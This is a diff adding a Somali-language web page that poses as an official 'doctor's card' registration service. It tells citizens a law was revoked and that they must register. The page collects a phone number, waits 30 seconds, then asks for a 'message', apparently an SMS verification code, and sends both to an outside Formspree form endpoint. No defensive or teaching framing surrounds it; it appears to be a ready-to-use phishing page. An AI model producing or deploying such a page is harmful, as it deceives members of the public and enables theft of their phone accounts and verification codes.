@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Kaadhka Dhaqtarka</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #f4f7f9;
+      color: #222;
+    }
+
+    header {
+      background: white;
+      min-height: 90px;
+      padding: 15px 25px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+    }
+
+    /* LOGO */
+    .logo {
+      width: 75px;
+      height: 75px;
+      object-fit: contain;
+      border-radius: 10px;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      padding: 20px;
+    }
+
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+
+    h1 {
+      color: #075985;
+      margin-bottom: 20px;
+      font-size: 27px;
+    }
+
+    p {
+      line-height: 1.8;
+      font-size: 17px;
+      margin-bottom: 20px;
+    }
+
+    .notice {
+      background: #fff8dc;
+      border: 1px solid #ead58a;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    button {
+      background: #075985;
+      color: white;
+      border: none;
+      padding: 14px 25px;
+      border-radius: 8px;
+      font-size: 17px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #064e73;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    input,
+    textarea {
+      width: 100%;
+      padding: 13px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 7px;
+      font-size: 16px;
+    }
+
+    textarea {
+      min-height: 130px;
+      resize: vertical;
+    }
+
+    #timer {
+      font-size: 18px;
+      color: #075985;
+      margin: 20px 0;
+      font-weight: bold;
+    }
+
+    .success {
+      background: #e8f7ed;
+      color: #176b35;
+      padding: 20px;
+      border-radius: 10px;
+      line-height: 1.8;
+    }
+
+    footer {
+      text-align: center;
+      padding: 25px;
+      color: #777;
+      font-size: 13px;
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <!--
+    HALKAN LOGO-GAAGA KU DAR:
+    <img src="logo.png" class="logo" alt="Logo">
+  -->
+
+  <img src="logo.png" class="logo" alt="Logo">
+</header>
+
+
+<div class="container">
+
+  <!-- BOGGA HORE -->
+  <div class="card" id="home">
+
+    <h1>Wacyigelin ku saabsan Kaadhka Dhaqtarka</h1>
+
+    <div class="notice">
+      <strong>Fiiro gaar ah:</strong>
+      Boggan waa adeeg maamul/wacyigelin ah oo uu maamulo maamulka boggan.
+    </div>
+
+    <p>
+      Muwaadin, dhawaan waxaa la laalay xeerkii dhaqaatiirta u yaallay.
+      Sidaas darteed waxaan shacabka ugu baaqaynaa in muwaadin kastaa
+      uu isdiiwaangeliyo si uu u qaato kaadhka dhaqtarka.
+    </p>
+
+    <p>
+      Kuwii hore u haystay kaadhkana waa loo cusboonaysiin doonaa.
+    </p>
+
+    <p>
+      Fadlan muwaadin, haddii aad rabto inaad isdiiwaangeliso,
+      hoos ka taabo.
+    </p>
+
+    <button onclick="startRegistration()">
+      Halkan Taabo
+    </button>
+
+  </div>
+
+
+  <!-- NUMBER -->
+  <div class="card hidden" id="numberSection">
+
+    <h1>Isdiiwaangelinta</h1>
+
+    <p>
+      Fadlan geli lambarka telefoonkaaga.
+    </p>
+
+    <form id="registrationForm"
+          action="https://formspree.io/f/xnpjnzak"
+          method="POST">
+
+      <input
+        type="tel"
+        name="phone"
+        placeholder="Geli lambarka telefoonka"
+        required
+      >
+
+      <div id="timer">
+        Fadlan sug 30 ilbiriqsi...
+      </div>
+
+      <!-- QAYBTA FARIINTA -->
+      <div id="messageSection" class="hidden">
+
+        <textarea
+          name="message"
+          placeholder="Halkan ku qor fariintaada..."
+          required></textarea>
+
+        <button type="submit">
+          Register
+        </button>
+
+      </div>
+
+    </form>
+
+  </div>
+
+
+  <!-- GUUL -->
+  <div class="card hidden" id="successSection">
+
+    <div class="success">
+
+      <h2>Waad ku mahadsan tahay</h2>
+
+      <p>
+        Fadlan muwaadin, waanu helnay isdiiwaangelintaada.
+      </p>
+
+      <p>
+        Waxaanu dib kaaga soo sheegi doonaa xarunta
+        aad ka qaadan doonto kaadhka dhaqtarka.
+      </p>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<footer>
+  © 2026 — Adeegga Kaadhka Dhaqtarka
+</footer>
+
+
+<script>
+
+  function startRegistration() {
+
+    document.getElementById("home").classList.add("hidden");
+
+    document
+      .getElementById("numberSection")
+      .classList.remove("hidden");
+
+    startTimer();
+  }
+
+
+  function startTimer() {
+
+    let seconds = 30;
+
+    const timer =
+      document.getElementById("timer");
+
+    const interval = setInterval(function() {
+
+      seconds--;
+
+      timer.innerHTML =
+        "Fadlan sug " + seconds + " ilbiriqsi...";
+
+      if (seconds <= 0) {
+
+        clearInterval(interval);
+
+        timer.innerHTML =
+          "Hadda waxaad diri kartaa fariintaada.";
+
+        document
+          .getElementById("messageSection")
+          .classList.remove("hidden");
+      }
+
+    }, 1000);
+  }
+
+
+  document
+    .getElementById("registrationForm")
+    .addEventListener("submit", function(event) {
+
+      event.preventDefault();
+
+      const form = this;
+
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(form),
+        headers: {
+          "Accept": "application/json"
+        }
+      })
+      .then(response => {
+
+        if (response.ok) {
+
+          document
+            .getElementById("numberSection")
+            .classList.add("hidden");
+
+          document
+            .getElementById("successSection")
+            .classList.remove("hidden");
+
+        } else {
+
+          alert("Fariinta lama diri karin. Fadlan isku day mar kale.");
+
+        }
+
+      })
+      .catch(() => {
+
+        alert("Waxaa dhacay cilad. Fadlan isku day mar kale.");
+
+      });
+
+    });
+
+</script>
+
+</body>
+</html>
